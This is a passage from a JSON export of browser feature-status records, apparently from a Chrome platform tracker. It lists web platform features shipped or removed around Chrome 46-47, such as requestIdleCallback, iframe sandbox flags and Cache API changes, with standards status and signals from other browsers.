      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 47
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=537177",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These were in SVG 1.1 put have been removed:\r\nhttp://www.w3.org/TR/SVG11/struct.html#InterfaceSVGSVGElement\r\nhttp://www.w3.org/TR/SVG2/struct.html#InterfaceSVGSVGElement\r\n\r\nThese properties all return the constant 0.2645833194255829 on all platforms, so they don't do what their names suggest.",
    "id": 5478103916740608,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/SVGSVGElement#Browser_compatibility"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:27:26.616060",
      "by": "ericbidelman@google.com"
    },
    "name": "Service Worker: Change the fetch API request flags (mode, credentials and redirect) for navigation requests.",
    "tags": [
      "service worker fetch manual redirect"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/whatwg/fetch/issues/106#issuecomment-128735776",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "horo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://crbug.com/522873",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The flags of request objects which are passed to the service worker's Fetch Event handler for navigation requests will be changed.\r\n\r\nCurrent:\r\n mode: \"no-cors\"\r\n credentials: \"same-origin\"\r\n redirect: \"follow\" (available since in M46)\r\n\r\nFrom M47:\r\n mode: \"same-origin\"\r\n credentials: \"include\"\r\n redirect: \"manual\"",
    "id": 6390594951708672,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Request/Request"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:13.914760",
      "by": "ericbidelman@google.com"
    },
    "name": "The Placeholder-shown Pseudo-class: :placeholder-shown",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/selectors-4/#placeholder",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1069012",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "ramya.v@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=451120",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=118162",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The :placeholder-shown pseudo-class matches an input element that is showing placeholder text.",
    "id": 6404760559157248,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:52.414460",
      "by": "ericbidelman@google.com"
    },
    "name": "UIEvent.sourceCapabilities & InputDeviceCapabilities.firesTouchEvents",
    "comments": "Polyfill: https://github.com/WICG/InputDeviceCapabilities/blob/gh-pages/inputdevicecapabilities-polyfill.js",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://wicg.github.io/InputDeviceCapabilities/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://www.w3.org/2015/02/17-touchevents-minutes.html#item02",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "rbyers@chromium.org",
          "lanwei@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=476530",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://www.w3.org/2015/02/17-touchevents-minutes.html#item02",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=146848",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The InputDeviceCapabilities API provides details about the physical device responsible for generating an event. InputDeviceCapabilities.firesTouchEvents returns whether this device dispatches touch events. All types of UIEvent now have their own sourceCapabilities attribute which returns the InputDeviceCapabilities associated with the physical device responsible for them.",
    "id": 5681847971348480,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2015/10/inputdevicecapabilities",
        "",
        "https://docs.google.com/document/d/1WLadG2dn4vlCewOmUtUEoRsThiptC7Ox28CRmYUn8Uw/edit",
        "",
        "https://developer.mozilla.org/en-US/docs/Web/API/InputDeviceCapabilities_API",
        ""
      ],
      "samples": [
        "https://developer.mozilla.org/en-US/docs/Web/API/InputDeviceCapabilities_API"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:42.641230",
      "by": "ericbidelman@google.com"
    },
    "name": "requestIdleCallback",
    "tags": [
      "requestIdleFrame",
      "idle",
      "deadline",
      "background",
      "task",
      "setimmediate"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/requestidlecallback/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-web-perf/2015Jul/0011.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 47
        },
        "owners": [
          "rmcilroy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 47,
        "ios": 47,
        "blink_components": [
          "Blink"
        ],
        "desktop": 47,
        "flag": false,
        "android": 47,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=514656",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-web-perf/2015Jul/0011.html",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An API which allows posting of tasks which are scheduled during periods when the browser is idle, and are passed a deadline when called which is calculated based on how long the browser expects to remain idle. This enables developers to perform background work on the main event loop, without impacting latency-critical events such as animation and input response.",
    "id": 5572795866021888,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/requestIdleCallback",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/cancelIdleCallback",
        "",
        "https://developers.google.com/web/updates/2015/08/using-requestidlecallback"
      ],
      "samples": [
        "https://developers.google.com/web/updates/2015/08/using-requestidlecallback"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-26 07:37:43.469610",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "'allow-popups-to-escape-sandbox' sandboxing flag.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://wiki.whatwg.org/wiki/Iframe_sandbox_improvments",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1190641",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://crbug.com/487157",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/14970816-implement-allow-popups-to-escape-sandbox-token-for?tracking_code=29687a9e7ed4aff928b6a30ce474f29c",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=158875",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This is a new flag for `<iframe sandbox=\"...\">` which will allow a sandboxed document to spawn new windows without forcing the sandboxing flags upon them. This will allow, for example, a third-party advertisement to be safely sandboxed without forcing the same restrictions upon a landing page.",
    "id": 5708368589094912,
    "resources": {
      "docs": [
        "https://lists.w3.org/Archives/Public/public-whatwg-archive/2015May/0035.html",
        "https://www.w3.org/Bugs/Public/show_bug.cgi?id=28817",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/allow-popups-to-escape-sandbox/index.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-08-14 16:10:15.238110",
      "by": "majidvp@chromium.org"
    },
    "name": "API to disable scroll restoration on history navigation",
    "tags": [
      "scroll position restoration"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/history.html#dom-history-scroll-restoration",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1155730",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "majidvp@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=477353",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=147782",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The API allows web applications to explicitly disable user agents default scroll restoration behavior on history navigation through `history.scrollRestoration = 'manual'`.",
    "id": 5657284784947200,
    "resources": {
      "docs": [
        "http://wpt.fyi/html/browsers/browsing-the-web/history-traversal/persisted-user-state-restoration/",
        "https://developer.mozilla.org/en-US/docs/Web/API/History",
        "https://developers.google.com/web/updates/2015/09/history-api-scroll-restoration"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:30.550040",
      "by": "ericbidelman@google.com"
    },
    "name": "Block modal dialogs inside a sandboxed iframe.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://crbug.com/483624",
        "intervention": false
      },
      "opera": {
        "android": 34,
        "desktop": 34
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Folks in Google's anti-malvertising team would like to be able to prevent sandboxed frames from popping up confusing, modal messages to users. This includes things like `alert()`, `confirm()`, and `prompt()` (and `print()` (and maybe authentication dialogs)).",
    "id": 4747009953103872,
    "resources": {
      "docs": [
        "https://lists.w3.org/Archives/Public/public-whatwg-archive/2015May/0035.html",
        "https://www.w3.org/Bugs/Public/show_bug.cgi?id=28818",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/alert",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/confirm",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/prompt",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/print"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/block-modal-dialogs-sandboxed-iframe/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-27 02:07:21.502490",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Intrinsic Sizing",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/css3-sizing/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://logs.glob.uno/?c=mozilla%23layout&s=12+Aug+2015&e=12+Aug+2015#c6757",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "ojan@chromium.org",
          "cbiesinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "webview": 46,
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/cssintrinsicsizing",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2015-August/027604.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Extends the CSS sizing properties with keywords that represent content-based \"intrinsic\" sizes and context-based \"extrinsic\" sizes, allowing CSS to more easily describe boxes that fit their content or fit into a particular layout context.\r\n\r\n(Note that the \"fill\" keyword is only shipping prefixed so far, pending CSSWG agreement to unprefix)",
    "id": 5901353784180736,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/width",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/height"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/css-intrinsic-sizing/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:15.423340",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS.escape()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/cssom/#the-css.escape%28%29-method",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=955860#c32",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "mathias@qiwi.be"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=331218",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "`CSS.escape()` serializes a string as a CSS identifier. This enables developers to easily and securely do things like escaping a string for use as part of a selector.\r\n",
    "id": 6526863593701376,
    "resources": {
      "docs": [
        "https://mathiasbynens.be/notes/css-escapes",
        "https://github.com/mathiasbynens/CSS.escape"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/css-escape/index.html",
        "https://developer.mozilla.org/en-US/docs/Web/API/CSS/escape"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-08-18 20:29:44.618400",
      "by": "ericbidelman@google.com"
    },
    "name": "Cache API is restricted to secure origins",
    "tags": [
      "cache",
      "storage",
      "cachestorage"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/41",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "jsbell@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink>Storage>CacheStorage"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=501380",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Cache API exposed to window and worker contexts (not just service worker) shipped in Chrome 43. As of Chrome 46, the API is restricted to secure origins (HTTPS only), per https://github.com/slightlyoff/ServiceWorker/issues/709",
    "id": 5740842165731328,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache",
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache/add",
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache/addAll",
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache/put"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-04-26 07:32:40.925640",
      "by": "Patket@microsoft.com"
    },
    "name": "Cache.addAll()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/41",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "nhiroki@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink>Storage>CacheStorage"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=510298",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "addAll() takes an array of RequestInfo objects, fetches them and adds the response objects into this Cache object.",
    "id": 4922023562182656,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Cache/addAll",
        "https://developers.google.com/web/updates/2015/09/updates-to-cache-api"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/service-worker/prefetch/index.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:04.334750",
      "by": "ericbidelman@google.com"
    },
    "name": "DOMException constructor",
    "comments": "throw new DOMException('The operation could not be compeleted', 'AbortError');",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://heycam.github.io/webidl",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "ios": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://crbug.com/420175",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow DOMExceptions to be created from script",
    "id": 5759577014403072,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/DOMException",
        "https://developer.mozilla.org/en-US/docs/Web/API/DOMException/DOMException"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:14.697480",
      "by": "ericbidelman@google.com"
    },
    "name": "Event.isTrusted attribute",
    "comments": "Intended primarily for use by extensions, to determine if an event was dispatched by a script running in the main world.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/DOM-Level-3-Events/#trusted-events",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "kenrb@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=334015",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Event.isTrusted is an attribute that is true when the event was generated by a user action, and false when the event was created or modified by script, or dispatched via dispatchEvent.",
    "id": 6461137440735232,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/event-istrusted/index.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:42.166240",
      "by": "ericbidelman@google.com"
    },
    "name": "Fetch API: Deprecate and remove Request.context",
    "tags": [
      "Fetch API"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 46
        },
        "owners": [
          "falken@chromium.org",
          "hiroshige@chromium.org",
          "shiva.jm@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=515786",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Request.context was implemented in Chrome 44 (https://www.chromestatus.com/feature/4699713102151680), but is removed from the spec as a result of discussion (https://github.com/whatwg/fetch/issues/93).\r\n\r\nChrome 45: Added deprecation warning.\r\nChrome 46: Removed.",
    "id": 5534702526005248,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Request/context"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-04-26 07:31:39.915720",
      "by": "Patket@microsoft.com"
    },
    "name": "Fetch API: Request.redirect",
    "tags": [
      "request",
      "fetch",
      "redirect"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/#concept-request-redirect-mode",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1184607",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "horo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=510650",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Request.redirect could be \"follow\", \"error\" or \"manual\".\r\n\r\nIf it is \"follow\", fetch() API follows the redirect response (HTTP status code = 301,302,303,307,308).\r\nIf it is \"error\", fetch() API treats the redirect response as an error.\r\nIf it is \"manual\", fetch() API doesn't follow the redirect and returns an opaque-redirect filtered response which wraps the redirect response.\r\n\r\n",
    "id": 4614142321229824,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Request"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:41.681250",
      "by": "ericbidelman@google.com"
    },
    "name": "HTTP Client Hints: DPR, Width, Viewport-Width",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://igrigorik.github.io/http-client-hints/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=935216",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "ios": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=458983",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "url": "http://ircbot.responsiveimages.org/bot/log/respimg/2015-03-05#T117451",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
